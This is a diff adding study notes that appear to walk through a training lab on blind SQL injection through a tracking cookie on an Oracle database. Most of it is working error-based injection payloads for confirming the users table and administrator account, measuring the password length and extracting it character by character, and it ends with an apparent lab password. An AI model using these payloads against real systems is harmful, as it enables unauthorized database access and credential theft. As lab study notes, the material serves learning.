@@ -1,0 +1,53 @@
+--- Blind SQL injection with Conditional Error
+
+Vulnerable Paramenter  - Tracking Cookie
+
+End Goals:
+ - Output admin password 
+ - Login as Admin User
+
+ 1) Prove that parameter is Vulnerable
+
+// Not a MySQL database
+ '' --> No Error  ' || (select '') || '
+
+  -->  Oracle DB needs Oracle Syntax
+ ' || (select '' from dual) || '
+ ' || (select '' from dualsgbebdeb) || ' --> ERROR 
+
+ 2) Confirm that the user table exists in the database
+ ' || (select '' from users) || '  --> Error
+ ' || (select '' from users where rownum =1) || '  --> User table exists
+
+ 3)   Confirm that the admin user exists in the user DB
+ ' || (select '' from users where username='administrator') || '
+
+' || (select CASE WHEN (1=0) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' = 200 Response
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual) || ' = 500 Response Internal Server Error
+
+ -- From Clause first then the Select portion will not run 
+
+' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator') || '
+ -->  Internal Server Error -> admin user exists
+
+ ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='sgsgswg') || '
+ --> 200 Response -> means User does not exist in DB 
+
+ 4) Determine length of password
+ ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and LENGTH(password)>50) || '
+
+ --> 200 Response Length of pasword is less than 50 and greater than 1
+
+ Intruder used to find password
+ -->> 20 Characters
+
+ 5) Output the admi password
+
+ first letter = a?
+
+ ' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users where username='administrator' and substr(password,1,1)='a') || '
+
+administrator password
+g67nb5rdc8c0ymcq0zxh
+
+
